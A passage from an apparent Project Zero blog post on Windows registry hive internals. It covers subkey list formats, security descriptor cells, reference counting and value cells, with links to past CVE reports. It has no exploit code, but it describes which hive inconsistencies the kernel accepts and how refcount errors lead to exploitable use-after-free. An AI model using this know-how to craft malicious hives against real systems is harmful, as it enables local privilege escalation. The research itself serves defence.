When it comes to the structure layout of the fast leaf, it is basically the same as the index leaf, but it has a different signature ('lf') and twice as many entries in the List array due to the addition of hints. There doesn't seem to be any structure definition corresponding specifically to fast leaves in the public symbols, which either means that the structure is a non-public one, or it is also accessed via \_CM\_KEY\_INDEX in the source code, but through references such as Index.List[2\*n] instead of Index.List[n]. An illustration of a fast leaf containing the five example subkeys is shown below:

[![Fast Leaf diagram containing the five example subkeys](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjR21S8gOfvMWCmn3wA9caP05aHsplcoyJ0OcsyK6ZibKgAIn8wciEdZ_Me4VkWBt2a_RiDkHk9LVKzTMSnN_3UTOSsHiwcs7AkXuCMXGQqkHZs1wlDTe-b2dAEWh_EQBjm2Zf8oT85pwnnyGIFmnSu8N-LOP47in47a6LYxx2zU0s6lx8dowpA0d1uIl8/s1200/image4.png "Fast Leaf diagram containing the five example subkeys")](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjR21S8gOfvMWCmn3wA9caP05aHsplcoyJ0OcsyK6ZibKgAIn8wciEdZ_Me4VkWBt2a_RiDkHk9LVKzTMSnN_3UTOSsHiwcs7AkXuCMXGQqkHZs1wlDTe-b2dAEWh_EQBjm2Zf8oT85pwnnyGIFmnSu8N-LOP47in47a6LYxx2zU0s6lx8dowpA0d1uIl8/s1999/image4.png)

##### Hash leaves

Hash leaves are the third and last (for now) iteration of the subkey index format, introduced in Windows XP in 2001 (regf version 1.5). They have exactly the same data layout as fast leaves, but are characterized by the 'lh' signature, and the 32-bit hint is a simple hash of the entire string instead of an inline representation of the first four characters. The specific hashing algorithm is implemented in the internal CmpHashUnicodeComponent function, and can be summarized with the following steps:

1. Start with a hash equal to 0
2. For every character in the string:

1. Hash = (Uppercase(Character) + 37 \* Hash) % 0x100000000

3. Return the hash to the caller

The main benefit of this approach is that it works equally well with ASCII and non-ASCII strings, and it covers the entire name and not just a prefix, further limiting the number of necessary references to the subkey nodes during key lookup. However, you may notice that a full-string hash isn't really compatible with the concept of binary search, and indeed, whenever a hash leaf is used, the kernel performs a linear search instead of a binary one, as can be seen in the corresponding CmpFindSubKeyByHashWithStatus function. In theory, this could lead to iterating through 65535 keys (the maximum number of entries in a hash leaf), but in practice, the kernel makes sure that a hash leaf is never longer than 1012 elements. This is okay for performance, because when more subkeys are associated with a key, a second-level data structure comes into play (the root index, see the next section), and that one is always traversed with a binary search. Overall, it seems possible that the cache friendliness of the hash leaf makes up for its theoretically worse lookup complexity, especially in the average case.

A corresponding diagram of a hash leaf data layout is shown below:

[![Image showing hash leaf data layout as described above](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjSJ-jlTLvArbHK0iIrfnYUFm0rFVw3APRQuN8TYOVhUPhUEFNPHbOik1OgSb5VjWWwM79gJf4CUHQKZCrz8nPdMjFUgTNs2N1kT3xFcIeBLo9dd0UHSMTd1WDiS0Qk5OAeDK_GANlMrx4yeTMVP7JaJmY1OQtHI3_SXMEdCfNw0JLbBaA12eeamo6_4HM/s1200/image15.png "Image showing hash leaf data layout as described above")](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjSJ-jlTLvArbHK0iIrfnYUFm0rFVw3APRQuN8TYOVhUPhUEFNPHbOik1OgSb5VjWWwM79gJf4CUHQKZCrz8nPdMjFUgTNs2N1kT3xFcIeBLo9dd0UHSMTd1WDiS0Qk5OAeDK_GANlMrx4yeTMVP7JaJmY1OQtHI3_SXMEdCfNw0JLbBaA12eeamo6_4HM/s1999/image15.png)

##### Root indexes

Each key in the registry can potentially have many thousands of subkeys, but having them stored in one very long list (such as a single index, fast or hash leaf) could lead to poor performance for some operations. For example, whenever a new key is inserted into the alphabetically sorted list, the portion of the list after the new key has to be moved in memory to make room for the new item. Similar CPU-heavy situations could arise when extending the dynamically sized array in the hive, and potentially having to copy its entire contents to a new cell if the existing one doesn't have any free space behind it. In the worst case scenario, this would have a complexity of O(n) per operation, which is too slow for such an important system mechanism as the Windows registry.

It is likely for this reason that whenever the subkey list becomes longer than 1012 elements for the first time, a second-level index called the root index is inserted into the data structure. This has the goal of splitting a single long list into several shorter ones, which are easier to manage in memory. Root indexes cannot be nested or referenced recursively by one another: a subkey list may either be non-existent, a single leaf-type list, or a single root index pointing at leaf-type lists (in other words, the list may be 0, 1 or 2 levels deep).

The root index has existed for as long as the index leaves have: since the very first regf version 1.0 in Windows NT 3.1 Pre-Release. It also has the same layout represented by the \_CM\_KEY\_INDEX structure, which consists of a signature ('ri' in this case), a 16-bit count and an array of cell indexes pointing at leaf-type lists, without any additional hints. An example diagram of a two-level subkey index containing five keys is shown below:

[![An image showing an example diagram of a two-level subkey index containing five keys](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjWjDioDrxKadIbSrn48slGPbLJVi4YcOls62a4ruBHalts-KBFnJOO4NyUEqdtze-EyWCtBdrJSMrbaPNx0E3O1s2d3hWqbYV_6pwjmIW-rctVdnfn6dbIdEo7hyPjPr2yePJOtA6xOA2D_v_BPVVEnH-M2AMaKhrMtrTZBF4UWywvboQURcrYKNXWfAQ/s1200/image13.png "An image showing an example diagram of a two-level subkey index containing five keys")](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjWjDioDrxKadIbSrn48slGPbLJVi4YcOls62a4ruBHalts-KBFnJOO4NyUEqdtze-EyWCtBdrJSMrbaPNx0E3O1s2d3hWqbYV_6pwjmIW-rctVdnfn6dbIdEo7hyPjPr2yePJOtA6xOA2D_v_BPVVEnH-M2AMaKhrMtrTZBF4UWywvboQURcrYKNXWfAQ/s1999/image13.png)

##### Fundamental subkey list consistency requirements

There is a set of some very basic format consistency requirements concerning subkey indexes, which must be always met for any active hive in the system, regardless of whether it has been loaded from disk or created from scratch at runtime. These are the minimum set of rules for this data structure to be considered as "valid", and they are tightly connected to the memory safety guarantees of the kernel functions that operate on them. They are as follows:

* The signature of each subkey list cell must be correctly set to its corresponding type, one of 'li', 'lf', 'lh' or 'ri'.
* The size of the cell must be greater or equal to the number of bytes required to store all of the elements in the "List" array, according to the value of the "Count" member.
* A subkey list cell may never be empty, i.e. \_CM\_KEY\_INDEX.Count mustn't be zero (whenever it becomes zero, it should be freed and un-referenced in any of the other hive cells).
* The number of subkeys cached in the key node (\_CM\_KEY\_NODE.SubKeyCounts[x]) must be equal to the number of subkeys defined in the subkey index (i.e. the sum of \_CM\_KEY\_INDEX.Count of its index leaves).
* The cell indexes stored in \_CM\_KEY\_NODE.SubKeyLists[x] must either be HCELL\_NIL (if SubKeyCounts[x] is zero), or point to a root index or one of the three leaf types. Additionally, SubKeyCounts[1] must be zero and SubKeyLists[1] must be HCELL\_NIL on hive load.
* All cell indexes stored in a root index must point at valid leaf indexes.
* All cell indexes stored in leaf indexes must point at valid key nodes.
* All hints specified in the fast leaves and hash leaves must be consistent with the names of their corresponding keys.
* The overall subkey list must be sorted lexicographically, i.e. the name of each n+1th subkey must be strictly greater than the name of the nth subkey. This also entails that there mustn't be any duplicates in the subkey list, neither with regards to the cell index or the subkey name.

Notably, there are also some constraints that seem very natural, but are in fact not enforced by the Windows kernel:

* There is no requirement that the format of a leaf-type index must be consistent with the version of the hive: instead, every one of li/lf/lh types are accepted for every hive version 1.3 – 1.6. The most glaring example of this behavior is that hash leaves are allowed in hive versions 1.3 and 1.4, even though they were historically only introduced in version 1.5 of the format.
* There is no requirement that all the leaf indexes referenced by a root index are all of the same type. In fact, a single subkey list may consist of an arbitrary combination of index leaves, fast leaves and hash leaves, and the kernel must handle such situations gracefully.
* Beyond the fact that none of the actively used subkey indexes may be empty, there are no limitations with regards to how the subkeys are laid out in the data structure. For example, the existence of a root index doesn't automatically indicate that there are many subkeys on the list: there may as well be a single root index, pointing to a single leaf, containing a single subkey. It is also allowed for several leafs being part of a single root index to have wildly different counts, with some single-digit ones coexisting with others around the 64K mark. The kernel doesn't ensure any advanced "balancing" of the subkey index by default – it does split large leafs into smaller ones, but only while adding a new subkey, and not during the loading of an existing hive.

Three examples of kernel vulnerabilities that were directly related to the handling of subkey lists are: [CVE-2022-37956](https://project-zero.issues.chromium.org/issues/42451449) (integer overflows in registry subkey lists leading to memory corruption), [CVE-2022-38037](https://project-zero.issues.chromium.org/issues/42451465) (memory corruption due to type confusion of subkey index leaves in registry hives) and [CVE-2024-26182](https://project-zero.issues.chromium.org/issues/42451661) (subkey list use-after-free due to mishandling of partial success in CmpAddSubKeyEx). I personally find the first one (CVE-2022-37956) particularly interesting, because the hive memory corruption could be triggered with the right sequence of API calls, or even just command-line reg.exe tool invocations. Granted that the number of required operations was quite high (around 66 million), but it still goes to show that being intimately familiar with the inner workings of the target software may open new avenues of exploitation that would otherwise not be available. For a detailed explanation of the subkey list management logic, see the next section.

##### Internal Windows logic of handling subkey lists

On top of the requirements and restrictions imposed by the regf format itself, there are some further characteristics of most registry hives found on real systems, caused by some decisions implemented in the logic of the Windows kernel. The most important thing to note is that, as mentioned above, the kernel operates on any subkey list lazily, only when there is a need to do so due to a key being added/deleted in the registry. Therefore, a weirdly formatted (but adhering to the bare regf requirements) subkey index will remain in this state after loading, for as long as a client application doesn't decide to change it.

Most of the relevant high-level logic of handling subkey lists takes place when adding new keys, and is illustrated in the flow chart below:

[![Complex flow chart describing the high-level logic handling of the subkey lists when ading new keys](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgK4FzEO7DB1fgLZ96e54QiXFtGiXuQIuXZDq6WCo-MSWWPBmYF70XVTr4iDGRx9YVhQhpEvcVC5fbBzWjjMPTMl9HFYaBvO5bVgLvps6cFhOSi-6GjyAh21FZkfMTWHOrPBS813mxVaguSBeOVejinIUwG_zyqzo89apHwtN8d8QMso2zluEw0kfA6gq4/s1200/image12.png "Complex flow chart describing the high-level logic handling of the subkey lists when ading new keys")](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgK4FzEO7DB1fgLZ96e54QiXFtGiXuQIuXZDq6WCo-MSWWPBmYF70XVTr4iDGRx9YVhQhpEvcVC5fbBzWjjMPTMl9HFYaBvO5bVgLvps6cFhOSi-6GjyAh21FZkfMTWHOrPBS813mxVaguSBeOVejinIUwG_zyqzo89apHwtN8d8QMso2zluEw0kfA6gq4/s1999/image12.png)

The general high-level function that implements the above logic in the Windows kernel is CmpAddSubKeyEx, which then calls a few helper routines with mostly self-descriptive names: CmpAddSubKeyToList, CmpSelectLeaf, CmpSplitLeaf and CmpAddToLeaf. Compared to addition, the process of deleting a key from the list is very straightforward, and is achieved by removing it from the respective leaf index, freeing the leaf if it was the last remaining element, and freeing the root index if it was present and the freed leaf was its last remaining element. There are no special steps being taken other than the strictly necessary ones to implement the functionality.

Given the above, we can conclude that registry hives created organically by Windows generally adhere to the following set of extra rules:

* The leaf types being used are in line with the version of the hive: index and fast leaves for versions ≤1.4, and hash leaves for versions ≥1.5.
* All leaves within a single index root have the same type.
* Index leaves never contain more than 1012 elements.
* Once a root index is created for a key, it is never downgraded back to a single leaf index other than through the deletion of all subkeys, and creating a new one starting from an empty subkey list.

#### Security descriptors

Security descriptors play a central role in enforcing access control to the information stored in the registry. Their significance is apparent through the fact that they are the only mandatory property of registry keys, as opposed to classes, values and subkeys which are all optional. At the same time, large groups of keys typically share the same security settings, so it would make little sense to store a separate copy of the data for every one of them. For example, in a default installation of Windows 11, the SOFTWARE hive includes around 250,000 keys but only around 500 unique security descriptors. This is why they are the only type of cell in the hive that can be associated with multiple keys at the same time. By only storing a single instance of each unique descriptor in the hive, the system saves significant disk and memory space. However, this efficiency requires careful management of each descriptor's usage through reference counting, which ensures they can be safely freed when no longer needed.

When loading a hive, the kernel enumerates all of its security descriptors without having to traverse the entire key tree first. In order to make this possible, security descriptors in the stable space are organized into a doubly-linked list, starting at the descriptor of the root key. Internal consistency of this list is mandatory – if any inconsistencies are found, it is reset to become a single-entry list with just the root security descriptor and nothing else. If the root security descriptor itself is corrupted, the hive is deemed to be in an unrecoverable state and rejected completely.

While traversing the global list, the kernel also verifies that the binary encoding of the security descriptors is valid and safe to pass to internal security-related functions later in time. In the hives, descriptors are formatted as self-contained blobs of bytes adhering to the SECURITY\_DESCRIPTOR\_RELATIVE structure layout. Compared to other hive cells (key nodes etc.), the internal format of security cells is relatively complex: it is variable in size and contains multiple sub-structures (SIDs, ACLs, ACEs), length indicators and internal offsets. To detect any potential corruption early, the [RtlValidRelativeSecurityDescriptor](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlvalidrelativesecuritydescriptor) function must succeed for every descriptor in a newly loaded hive, otherwise the previously discussed fallback logic takes place.

The last step in the security descriptor validation process is to make sure that the reference counts specified in the hive are equal to the actual number of references from registry keys. This is achieved by re-counting the references when traversing the key tree structure of the hive, and later checking if the values found in \_CM\_KEY\_SECURITY.ReferenceCount are in line with the regenerated counts. If the two values are unequal, the refcount in the security cell is adjusted to reflect the correct number of references. This is critical for system security, because operating on an invalid refcount – especially an inadequately small one – may directly lead to exploitable memory corruption conditions.

Some examples of historical vulnerabilities related to the three fundamental aspects of security descriptor consistency are as follows:

* Linked list consistency: [CVE-2022-34708](https://project-zero.issues.chromium.org/issues/42451425), [CVE-2024-26178](https://github.com/googleprojectzero/p0tools/tree/master/WinRegLowSeverityBugs/Reports/13_CmpLightWeightPrepareSetSecDescUoW_security_list_confusion)
* Security descriptor binary format validity: [CVE-2022-35768](https://project-zero.issues.chromium.org/issues/42451427)
* Reference counting: [CVE-2022-34707](https://project-zero.issues.chromium.org/issues/42451423), [CVE-2023-28248](https://project-zero.issues.chromium.org/issues/42451552), [CVE-2023-35356](https://project-zero.issues.chromium.org/issues/42451596), [CVE-2023-35382](https://project-zero.issues.chromium.org/issues/42451592), [CVE-2023-38139](https://project-zero.issues.chromium.org/issues/42451601)

A high-level illustration of a security descriptor linked list consisting of three elements is shown in the diagram below:

[![A high-level illustration of a security descriptor linked list consisting of three elements](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjqTXWpBsQlSXs9DvSD8-xRXOpsZxH_n6U8a_qWbDBZE1mshkUwtD5b0x9OvxGTBtOR3mP6b6Xl0qRqRFtQ_3YFMC2ma6agYAicSzefN-iMcJOUS0keIdBbyYrGZoy144hS0vBLjBY3AJIfnZ-P6EP5fk2uMHKfRXzj7cnb4-dQCpiQcjb1hbVxWPG7W7U/s1200/image1.png "A high-level illustration of a security descriptor linked list consisting of three elements")](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjqTXWpBsQlSXs9DvSD8-xRXOpsZxH_n6U8a_qWbDBZE1mshkUwtD5b0x9OvxGTBtOR3mP6b6Xl0qRqRFtQ_3YFMC2ma6agYAicSzefN-iMcJOUS0keIdBbyYrGZoy144hS0vBLjBY3AJIfnZ-P6EP5fk2uMHKfRXzj7cnb4-dQCpiQcjb1hbVxWPG7W7U/s1999/image1.png)

##### Security cell format

Let's now have a look at the specific layout of the security cells. They are represented by the \_CM\_KEY\_SECURITY structure, whose definition is shown in the WinDbg format below:

0: kd> dt \_CM\_KEY\_SECURITY

nt!\_CM\_KEY\_SECURITY

   +0x000 Signature        : Uint2B

   +0x002 Reserved         : Uint2B

   +0x004 Flink            : Uint4B

   +0x008 Blink            : Uint4B

   +0x00c ReferenceCount   : Uint4B

   +0x010 DescriptorLength : Uint4B

   +0x014 Descriptor       : \_SECURITY\_DESCRIPTOR\_RELATIVE

Each of its fields is discussed in more detail in the following subsections.

###### Signature

The magic bytes of this cell type, equal to 0x6B73 ('sk'). It exists for informational purposes only, but isn't used for anything at runtime – it isn't even verified on hive load, and can therefore be anything in a binary-controlled hive.

###### Reserved

An unused field that may contain arbitrary data; never accessed by the kernel.

###### Flink and Blink

As discussed earlier, these are the forward and backward links in the security descriptor list. They must always be kept in a valid state. In a single-element list, Flink/Blink point at themselves – that is, at the security descriptor they are both part of.

###### ReferenceCount

This single field was arguably responsible for the most registry-related vulnerabilities out of all of the hive structures. It is a 32-bit unsigned integer that expresses the number of objects that actively rely on this security descriptor, which mostly means the key nodes associated with it, but not only. Whenever this member gets out of sync with the real number of references, it may lead to serious memory corruption primitives, so it is very important that the kernel ensures its correct value both on hive load and during any subsequent operations. The two prevalent risks are that:

* The refcount gets too small: when this happens, it is possible that the cell gets freed while some objects still hold active references to it. This leads to a straightforward use-after-free scenario, and in my experience, it is easily exploitable by a local attacker.
* The refcount gets too large: this situation doesn't immediately lead to memory corruption, but let's remember that the structure member has a limited, 32-bit width. If an attacker were able to indiscriminately increment the counter without real references to back it up, they could eventually get it to the maximum uint32 value, 0xFFFFFFFF. For many years, the Windows kernel hasn't implemented any protection against registry refcount integer overflows, so another incrementation of the field after 0xFFFFFFFF would wrap it back to zero, which brings us to the previous scenario of an inadequately small count. However, following some bug reports and discussions, Microsoft has gradually added overflow protection in the relevant, internal functions, starting in April 2023 and eventually landing the last missing check in November 2024. Thanks to this effort, I believe that as I am writing this, security descriptor refcount leaks should no longer be an exploitable condition.

Under most circumstances, the value of the refcount is somewhere between 1 and ~24.4 million (the maximum number of keys in a hive given the space constraints). However, it is interesting to note that it might be legitimately set to a greater value. Consider the following: immediately after loading a hive, all security refcounts are exactly equal to the number of keys associated with them. But, key nodes globally visible in the registry tree are not the only ones that can reference security cells; there may be also keys that have been created in the scope of a transaction and not committed yet, as well as pending, transacted operations of changing the security properties of a key (marked by the UoWAddThisKey and UoWSetSecurityDescriptor enums of type UoWActionType). They too may increase the refcount value beyond what would normally be possible with just regular, non-transacted keys. This phenomenon has been discussed in detail in the [CVE-2024-43641](https://project-zero.issues.chromium.org/issues/42451732) bug report.

Overall, reference counts are of great importance to system security, and every registry operation that involves it deserves a thorough security assessment.

###### DescriptorLength

This is the length of the security descriptor data (i.e. the size of the Descriptor array) expressed in bytes. It's worth noting that the format doesn't force it to be the minimum length sufficient to store the binary blob. This means that the overall cell length must be greater than DescriptorLength + 20 (i.e. the declared length of the descriptor plus the \_CM\_KEY\_SECURITY header), and in turn DescriptorLength must be greater than the actual size of the descriptor. Both cases of the cell size or the DescriptorLength having non-optimal values are accepted by the kernel, and the extra bytes are ignored.

###### Descriptor

This variable-length array stores the actual security descriptor in the form of the SECURITY\_DESCRIPTOR\_RELATIVE structure. It doesn't necessarily have to be formatted in the most natural way, and the only requirement is that it successfully passes the [RtlValidRelativeSecurityDescriptor](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlvalidrelativesecuritydescriptor) check with the RequiredInformation argument set to zero. This means, for example, that the Owner/Group/Sacl/Dacl components may be spread out in memory and have gaps in between them, or conversely, that their representations may overlap. This was one of the main contributing factors in [CVE-2022-35768](https://project-zero.issues.chromium.org/issues/42451427), but the fix was to more accurately calculate the length of irregularly-encoded descriptors, and the freedom to structure them in non-standard ways has remained. It is even possible to use a completely empty descriptor without any owner or access control entries, and such a construct will be acknowledged by the system, too.

Another somewhat interesting fact is that security descriptors are meant to be deduplicated, so naturally whenever a user assigns a security descriptor that already exists in the hive, it is simply reused and its reference count is incremented. However, again, the format (or rather its canonical implementation in Windows) doesn't force the uniqueness requirement upon the security descriptors in hives loaded from disk. So, even though they would be never created by the OS itself, multiple identical copies of a descriptor are allowed in specially crafted hives and may co-exist without (seemingly) causing any issues for the kernel.

The access rights defined by the security descriptors are based on permissions specific to the registry and its operations, so there is an access mask dedicated to creating keys (KEY\_CREATE\_SUB\_KEY), reading values (KEY\_QUERY\_VALUE), writing values (KEY\_SET\_VALUE), and so on. They all have self-descriptive names and are well-documented in [Registry Key Security and Access Rights](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights), so we won't spend more time discussing them here.

##### Security descriptors of volatile keys

Similarly to every other property of a registry key, the storage type of a security descriptor always matches the type of its associated key(s). This means that a stable key will always use a stable descriptor, and a volatile key – a volatile descriptor. It is the only "exception" to the rule that security descriptors are deduplicated and unique within the scope of the hive. If there are two keys with identical security settings but different storage types, they will reference two distinct security descriptor cells via their \_CM\_KEY\_NODE.Security fields, one with the highest bit set and the other with the bit clear. The descriptors stored on both sides are subject to the same rules with regards to reference counting, allocating and freeing.

Furthermore, we have previously discussed how all security descriptors in a hive are connected in one global doubly-linked list, but this only applies to the descriptors in the stable space. The functionality is needed so that the descriptors can be enumerated by the kernel when loading a hive from disk, and since volatile descriptors are in-memory only and disappear together with their corresponding keys on hive unload or a system shutdown, there is no need to link them together. The internal CmpInsertSecurityCellList function takes this into account, and points the Flink/Blink fields at themselves, making each volatile descriptor a single-entry list in order to keep it compatible with the list linking/unlinking code. This behavior is illustrated in the diagram below, with two volatile security descriptors each being in their own pseudo-list:

[![Diagram described in the paragraph above, showing two security descripitors capybara and sloth](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjFvU_lKPXAXNcaDpkFMhxssobFSIMemew9rQ21RFY-nGjVmKns8vvv60C6dKpxixMtkHG6l_Macrlpck03gUskUCkfq4b-yEXDog6a3gQeP4KhT0vnfmk7SDLoFLVBthjzkH-RiZ7OY5O5YXuTACqGv32p8gbs8zo9cQKD-w2pG6DMmI3ornrG9z9xDLU/s1200/image9.png "Diagram described in the paragraph above, showing two security descripitors capybara and sloth")](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjFvU_lKPXAXNcaDpkFMhxssobFSIMemew9rQ21RFY-nGjVmKns8vvv60C6dKpxixMtkHG6l_Macrlpck03gUskUCkfq4b-yEXDog6a3gQeP4KhT0vnfmk7SDLoFLVBthjzkH-RiZ7OY5O5YXuTACqGv32p8gbs8zo9cQKD-w2pG6DMmI3ornrG9z9xDLU/s1999/image9.png)

This slight quirk is the reason why the ability to create stable keys under volatile ones, which should normally not be possible, may be an exploitable condition with security impact. For details, see the "Creation of stable subkeys under volatile keys" section in the [CVE-2023-21748](https://project-zero.issues.chromium.org/issues/42451512) bug report, or the [CVE-2024-26173](https://github.com/googleprojectzero/p0tools/tree/master/WinRegLowSeverityBugs/Reports/04_Transacted_stable_under_volatile_keys) bug report.

##### Security descriptors in app hives

In normal registry hives, there are no artificial restrictions with regards to security descriptors. There may be an arbitrary number of them, and they may contain any type of settings the user wishes, as long as they have binary control over the hive file and/or the existing security descriptors grant them the access to change them to whatever they want. However, there are some limitations concerning security descriptors in application hives, as documented in the MSDN page of the [RegLoadAppKeyA](https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regloadappkeya) function:

| All keys inside the hive must have the same security descriptor, otherwise the function will fail. This security descriptor must grant the caller the access specified by the samDesired parameter or the function will fail. You cannot use the RegSetKeySecurity function on any key inside the hive. |
| --- |

The intent behind the quote seems to be that the security settings within an app hive should be uniform and immutable; that is, remain identical to their initial state at hive creation, and consistent across all keys. There is indeed some truth to the documentation, as trying to change the security of a key within an app hive with [RegSetKeySecurity](https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regsetkeysecurity), or to create a new key with a custom descriptor both result in a failure with STATUS\_ACCESS\_DENIED. However, the part about all keys having the same security descriptor is not actually enforced, and a user can freely load an app hive with any number of different security descriptors associated with the keys. This was reported to Microsoft as [WinRegLowSeverityBugs issue #20](https://github.com/googleprojectzero/p0tools/tree/master/WinRegLowSeverityBugs/Reports/20_App_hive_security_inconsistencies), but wasn't deemed severe enough to be addressed in a security bulletin (which I agree with), so for now, it remains an interesting discrepancy between the documentation and implementation.

#### Key values and value lists

While keys allow software to create a data organization hierarchy, values are the means of actually storing the data. Each value is associated with one specific key, and is characterized by the following properties:

* Name
* Type
* Data

In general, values are much simpler than keys. To begin with, they are not a full-fledged object in the NT Object Manager sense: you cannot open a handle to a value, and thus you may only access them through the handle of its associated key and its name. They also don't have dedicated security descriptors, so a client with a key handle with the KEY\_QUERY\_VALUE access can enumerate and read all values of the key, and the KEY\_SET\_VALUE rights allows the caller to create/modify/delete all values within a key. For these reasons, values are best thought of as elaborate attributes of a key, not as an independent entity.

There is no fixed limit on the number of values associated with a key other than the available hive space, which places the number at around 67 million (0x80000000 ÷ 0x20, the hive space divided by the minimum value cell size). The value list format is also not as optimized as the subkey index is: it is a linear, single-level list with just the raw value cell indexes, without any additional metadata like a header or hints. The list is not sorted either, and their order is defined by when they were added to the key. Finally, value name uniqueness is guaranteed on output, but not enforced on input: it is possible to load a specially crafted hive with several values with the same name, and contrary to duplicate keys, this doesn't seem to pose any fundamental problems for the registry implementation.

A high-level overview of the hive cells related to a key's value list is shown below:

[![Diagram showing the high-level overview of the hive cells related to a key's value list](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi-kkqHETa7hxjybGBjyP5n8vSsLqW5_62Y5wh6_0TumJfzZ02N3o3EJplOm34WUH2Aosppu38CHWJxaTZ4HWdpcivVAbr7Y60kmawVkTEQaZ47oRr3MuW-3TNhi_9EkySX5d8fBCQQvAGtQIkTpBgSFt8dMCaMKnAaZb160I1epSQtF7oJZeCXBwbLLnI/s1200/image2.png "Diagram showing the high-level overview of the hive cells related to a key's value list")](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi-kkqHETa7hxjybGBjyP5n8vSsLqW5_62Y5wh6_0TumJfzZ02N3o3EJplOm34WUH2Aosppu38CHWJxaTZ4HWdpcivVAbr7Y60kmawVkTEQaZ47oRr3MuW-3TNhi_9EkySX5d8fBCQQvAGtQIkTpBgSFt8dMCaMKnAaZb160I1epSQtF7oJZeCXBwbLLnI/s1999/image2.png)

In the next section, we will examine the internal layout and semantics of the \_CM\_KEY\_VALUE structure, which describes each unique value in the registry.

##### The key value cell

As usual, we can print out the structure definition in WinDbg:

0: kd> dt \_CM\_KEY\_VALUE

nt!\_CM\_KEY\_VALUE

   +0x000 Signature        : Uint2B

   +0x002 NameLength       : Uint2B

   +0x004 DataLength       : Uint4B

   +0x008 Data             : Uint4B

   +0x00c Type             : Uint4B

   +0x010 Flags            : Uint2B

   +0x012 Spare            : Uint2B

   +0x014 Name             : [1] Wchar

Let's examine each field more closely.

###### Signature

It identifies the cell as a key value, and must be equal to 0x6B76 ('vk'). It is verified during hive load, but isn't used for anything else later on.

###### NameLength and Name

The combination of these two fields specifies the name of the value: NameLength indicates the length of the string in bytes, and Name is an inline, variable-length buffer that stores the name itself. Let's consider the same criteria of the name that we have previously discussed in the context of registry keys:

* Compression: Similarly to keys, value names may be compressed if the VALUE\_COMP\_NAME (0x1) flag is set in \_CM\_KEY\_VALUE.Flags. In that case, the string is stored as 8-bit ASCII characters, otherwise the normal wide-character encoding is used.
* Length: The length of the name can be between 0 and [16,383](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-element-size-limits) characters. A length of zero indicates an alias for the value displayed by Regedit as "(Default)", a remnant of the design from Windows 3.1 where data was assigned directly to keys. As a sidenote, the correct enforcement of the upper limit was only introduced in October 2022 as a fix for [CVE-2022-37991](https://project-zero.issues.chromium.org/issues/42451478).
* Charset: All characters in the 0x0000 – 0xFFFF range are allowed in a value name, with no exceptions. Since values are not part of the same namespace as keys, this even includes backslashes. The only constraint is that if the corresponding key is a symbolic link, then the value must be named "SymbolicLinkValue", as it has a special meaning and stores the link's target path. An example of a bug related to sanitizing value names was [CVE-2024-26176](https://github.com/googleprojectzero/p0tools/tree/master/WinRegLowSeverityBugs/Reports/02_SymbolicLinkValue_OOB_read).
* Uniqueness: Value name uniqueness is not enforced on input, but it is maintained by the kernel at runtime on a best-effort basis. That means that whenever setting a value, the system will always try to reuse an existing one with the same name before creating a new one. Similarly to keys, value lookup is performed in a case-insensitive manner, but the original casing is preserved and visible to the clients.

###### DataLength

Specifies the length of the data stored in the value. The various ranges of the 32-bit space that the field can fall into are explained below:

| DataLength | Hive versions < 1.4 | Hive versions ≥ 1.4 |
| --- | --- | --- |
| 0x0 | Empty value, `Data` must be set to HCELL\_NIL. | |
| 0x1 – 0x3FD8 | Data stored directly in a backing cell pointed to by `Data`. | |
| 0x3FD9 – 0xFFFFC | Data stored directly in a backing cell pointed to by `Data`. | Data split into 16344-byte chunks and saved in a big data object pointed to by `Data`. |
| 0xFFFFD – 0x3FD7C028 | Invalid. |
| 0x3FD7C029 – 0x7FFFF000 | Not accepted on input due to a 16-bit integer overflow in [the](https://github.com/googleprojectzero/p0tools/tree/master/WinRegLowSeverityBugs/Reports/16_Registry_value_big_data_count_overflow) [big data chunk count](https://github.com/googleprojectzero/p0tools/tree/master/WinRegLowSeverityBugs/Reports/16_Registry_value_big_data_count_overflow). Feasible to set at runtime, but the saved data will be truncated due to the same bug / design limitation. |
| 0x7FFFF001 – 0x7FFFFFFF | Invalid | |
| 0x80000000 – 0x80000004 | Between 0–4 bytes stored inline in the `Data` field. | |
| 0x80000005 – 0xFFFFFFFF | Invalid. | |

###### Data

Responsible for storing or pointing to the data associated with the value. To summarize the table above, it can be in one or four states, depending on the data length and hive version:

1. Empty – equal to HCELL\_NIL, if DataLength is 0.
2. Inline – stores up to four bytes in the Data member of the value cell itself, as indicated by DataLength & 0x7FFFFFFF, if the highest bit of DataLength is set. As a side effect, an empty value can be represented in two ways: either as DataLength=0 or DataLength=0x80000000.
3. Raw data – points to a raw backing cell if Hive.Version < 1.4 or DataLength ≤ 0x3FD8.
4. Big data – points to a big data structure introduced in hive version 1.4, which is capable of storing 0xFFFF × 0x3FD8 = 0x3FD7C028 bytes (a little under 1 GiB). More on big data cells in the section below.

###### Type

